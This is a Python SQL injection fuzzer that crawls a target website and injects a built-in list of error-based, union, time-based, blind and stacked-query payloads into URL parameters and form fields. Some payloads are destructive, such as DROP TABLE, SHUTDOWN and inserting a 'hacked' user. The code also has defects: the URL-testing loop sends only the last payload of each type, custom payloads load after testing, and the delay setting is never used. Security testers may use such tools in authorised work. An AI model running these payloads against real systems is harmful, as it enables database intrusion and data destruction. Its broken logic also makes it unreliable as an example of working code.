import requests
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
import time
import json
import re
import argparse
init()

class SQLiFuzzer:
    def __init__(self, target_url, delay=1, verbose=False):
        self.payloads = self.load_payload()
        self.visited = set()
        self.target_url = target_url
        self.session = requests.Session()
        self.discovered_endpoints = set()
        self.vulnerabilities = []
        self.tested_urls = set()
        self.delay = delay
        self.verbose = verbose
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    def load_payload(self, file_path = None):
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    return json.load(f)
            except (FileNotFoundError, json.JSONDecodeError) as e:
                print(Fore.YELLOW + f"[!] Could not load payloads from {file_path}: {e}. Using default payloads." + Style.RESET_ALL)

        return {
            "error_based": [
                "'",
                "''",
                "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT DATABASE()), 0x3a, 0x3a, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)--",
                "' AND 1=(SELECT CAST(version() AS int))--",
                "' AND 1=CAST(current_database() AS int)--",
                "' AND 1=CONVERT(int, DB_NAME())--",
                "' AND 1=CONVERT(int, @@version)--",
                "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT user FROM DUAL))--",
                "' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT DATABASE())))--",
                "' AND UPDATEXML(1, CONCAT(0x3a, (SELECT DATABASE())), 1)--",
                "' OR 1=1",
                "' OR 1=1#",
                "' OR 1=1--",
                "' OR 1=1/*",
                "\"",
                "\"\"",
                "\" OR 1=1",
                "\" OR 1=1#",
                "\" OR 1=1--",
                "\" OR 1=1/*",
                ") OR ('1'='1",
                "') OR ('1'='1",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "@@VERSION",
                "@@version",
                "OR 1=1",
                "OR 1=1#",
                "OR 1=1--",
                "OR 1=1/*",
                "ORDER BY 1--",
                "ORDER BY 100--",
                "`",
                "``",
                "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                "sqlite_version()",
                "version()"
            ],
            "union_based": [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,sqlite_version()--",
                "' UNION SELECT NULL, @@version, NULL--",
                "' UNION SELECT NULL, banner, NULL FROM v$version WHERE ROWNUM=1--",
                "' UNION SELECT NULL, version(), NULL--",
                "' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype = 'U'--",
                "' UNION SELECT name, sql, NULL FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT table_name, NULL, NULL FROM all_tables--",
                "' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables--"
            ],
            "time_based": [
                "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                "' AND 1=(SELECT CAST(PG_SLEEP(5) AS INT))--",
                "' AND 1=(SELECT pg_sleep(5))--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(10000000))))--",
                "' AND SLEEP(5)--",
                "' WAITFOR DELAY '0:0:5'--",
                "'; SELECT pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                "\" AND 1=(SELECT CAST(PG_SLEEP(5) AS INT))--",
                "\" AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "\" WAITFOR DELAY '0:0:5'--",
                "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)",
                "1 AND 1=(SELECT CAST(PG_SLEEP(5) AS INT))",
                "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
                "1 WAITFOR DELAY '0:0:5'",
                "IF (1=1) WAITFOR DELAY '0:0:5'",
                "IF(1=1, SLEEP(5), 0)"
            ],
            "blind_based": [
                "' AND 1=1",
                "' AND 1=2",
                "' AND 'a'='a'",
                "' AND 'a'='b'",
                "' AND 1=LIKE('ABC',UPPER('abc'))--",
                "\" AND 1=1",
                "\" AND 1=2",
                "\" AND 'a'='a'",
                "\" AND 'a'='b'",
                "\" AND 1=LIKE('ABC',UPPER('abc'))--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1 AND 1=LIKE('ABC',UPPER('abc'))",
                "AND 1=1",
                "AND 1=2",
                "AND 'a'='a'",
                "AND 'a'='b'"
            ],
            "stacked_queries": [
                "'; CREATE TABLE vulnerable (id INT);--",
                "'; DROP TABLE vulnerable;--",
                "'; INSERT INTO users (username, password) VALUES ('hacked', 'hacked')--",
                "'; SHUTDOWN;--"
            ]
        }


    def discover_endpoints(self):
        urls_to_crawl = {self.target_url}
        discovered_forms = []
        try:
            while urls_to_crawl:
                url = urls_to_crawl.pop()
                if url in self.visited:
                    continue

                try:
                    response = self.session.get(url, timeout=10)
                    self.visited.add(url)
                except requests.RequestException as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"[-] Could not crawl {url}: {e}" + Style.RESET_ALL)
                    continue

                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    # Find links
                    for link in soup.find_all('a', href=True):
                        href = link.get('href')
                        full_url = urljoin(url, href)
                        if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                            clean_url = urlunparse(urlparse(full_url)._replace(fragment=''))
                            if clean_url not in self.visited:
                                self.discovered_endpoints.add(clean_url)
                                urls_to_crawl.add(clean_url)
                    # Find forms
                    for form_tag in soup.find_all('form'):
                        form_details = self.parse_forms(form_tag, url)
                        if form_details:
                            discovered_forms.append(form_details)

            print(Fore.GREEN + f"[+] Discovered {len(self.discovered_endpoints)} endpoints from links." + Style.RESET_ALL)
            print(Fore.GREEN + f"[+] Discovered {len(discovered_forms)} forms." + Style.RESET_ALL)
            return discovered_forms
        except Exception as e:
                print(Fore.RED + f"[-] Error during endpoint discovery: {e}" + Style.RESET_ALL)
        return []

    def parse_forms(self, form, base_url):
        form_details = {
            'action': urljoin(base_url, form.get('action')),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            if input_name:
                form_details['inputs'].append({'type': input_type, 'name': input_name, 'value': input_value})
        return form_details
    
    def test_all_endpoints(self):
        forms = self.discover_endpoints()

        for endpoint in self.discovered_endpoints:
            self.test_url(endpoint)
        
        for form in forms:
            self.test_form(form)

    def test_url(self, url):
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        if not query_params:
            return
        
        print(f"{Fore.CYAN}[+] Testing URL: {url}" + Style.RESET_ALL)

        for param in query_params:
            original_value = query_params[param][0]

            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    test_params = query_params.copy()
                    test_params[param] = payload
                    
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))

                    if test_url in self.tested_urls:
                        continue
                self.tested_urls.add(test_url)

                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    response_time = time.time() - start_time

                    vulnerable, evidence = self.analyze_response(response, payload, payload_type, original_value, response_time)

                    if vulnerable:
                        self.report_vulnerability(test_url, param, payload, payload_type, original_value, evidence)
                except Exception as e:
                    if self.verbose:
                        print(Fore.RED + f"[-] Error testing {test_url}: {e}" + Style.RESET_ALL)

    def test_form(self, form):
        print(f"{Fore.CYAN}[+] Testing form: {form['action']}" + Style.RESET_ALL)

        for input_field in form['inputs']:
            original_value = input_field['value']

            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    input_field['value'] = payload
                    test_data = {field['name']: field['value'] for field in form['inputs']}
                    response = self.session.post(form['action'], data=test_data)

                    vulnerable, evidence = self.analyze_response(response, payload, payload_type, original_value, response.elapsed.total_seconds())

                    if vulnerable:
                        self.report_vulnerability(form['action'], input_field['name'], payload, payload_type, original_value, evidence)

        input_field['value'] = original_value

    def analyze_response(self, response, payload, payload_type, original_value, response_time):
        response_text = response.text.lower()
        error_indicators = [
            'sql syntax',
            'mysql_fetch',
            'ora-01756',
            'postgresql',
            'unclosed quotation',
            'select.*from',
            'union.*select',
            'you have an error in your sql'
        ]
        for indicator in error_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                return True, f"Error indicator found: {indicator}"
            
        if payload_type == "blind_based":
            blind_indicators = [
                'welcome', 'login', 'error', 'success', 'admin', 'logout'
            ]
            content_changes = False
            for indicator in blind_indicators:
                in_original = indicator in original_value.lower() if  original_value else False
                in_response = indicator in response_text
                if in_original != in_response:
                    content_changes = True
                    break
            if content_changes: 
                return True, "Boolean-based: content changed"

        if payload_type == "time_based":
            if response_time > 4:
                return True, "Time-based: response time exceeded"

        if payload_type == 'union_based' and 'union' in payload.lower():
            union_indicators = [
                'null', 'version()', 'user', 'database()', 'table_name'
            ]

            for indicator in union_indicators:
                if indicator in response_text:
                    return True, f"Union-based: {indicator} found in response"
                
        return False, None

    def report_vulnerability(self, url, param_name, payload, payload_type, original_value, evidence, source="URL"):
        print(Fore.RED + f"[!] Vulnerability found at {url}" + Style.RESET_ALL)
        print(f"    URL: {url}")
        print(f"    Parameter: {param_name}")
        print(f"    Payload: {payload}")
        print(f"    Type: {payload_type}")
        print(f"    Original Value: {original_value}")
        print(f"    Evidence: {evidence}")

        vulnerability = {
            'url': url,
            'parameter': param_name,
            'payload': payload,
            'type': payload_type,
            'original_value': original_value,
            'evidence': evidence,
            'source': source
        }
        self.vulnerabilities.append(vulnerability)

    def generate_report(self, output_file=None):
        if not self.vulnerabilities:
            print(Fore.GREEN + "[+] No vulnerabilities found." + Style.RESET_ALL)
            return
        
        report = {
            'target': self.target_url,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()),
            'vulnerabilities': self.vulnerabilities
        }

        report_json = json.dumps(report, indent=4)
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report_json)
            print(Fore.GREEN + f"[+] Report saved to {output_file}" + Style.RESET_ALL)
        else:
            print(report_json)

        return report


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Fuzzer")
    parser.add_argument("url", help="Target URL to test")
    parser.add_argument("--delay", type=float, default=1, help="Delay between requests (seconds)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--output", help="Output file for the report (JSON format)")
    parser.add_argument("--payloads", help="Custom payloads JSON file")
    args = parser.parse_args()

    fuzzer = SQLiFuzzer(args.url, delay=args.delay, verbose=args.verbose)
    print(f"{Fore.CYAN}[+] Starting SQLi Fuzzer agianst" + Style.RESET_ALL)
    fuzzer.test_all_endpoints()
    report = fuzzer.generate_report(args.output)

    if args.payloads:
        fuzzer.payloads = fuzzer.load_payload(args.payloads)
    
    if report and report['vulnerabilities']:
        print(Fore.RED + "[!] SQL Injection vulnerabilities detected!" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "[+] No SQL Injection vulnerabilities found." + Style.RESET_ALL)

if __name__ == "__main__":
    main()